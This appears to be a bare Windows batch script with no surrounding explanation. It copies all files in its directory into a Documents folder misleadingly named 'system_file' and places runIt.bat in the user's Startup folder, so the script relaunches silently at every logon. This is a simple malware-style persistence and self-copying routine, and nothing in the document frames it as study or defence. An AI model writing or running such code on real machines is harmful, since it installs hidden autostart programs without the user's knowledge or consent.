@echo off
mkdir "%USERPROFILE%\My Documents\system_file"
copy *.* "C:\Users\%USERNAME%\Documents\system_file"
copy runIt.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp"



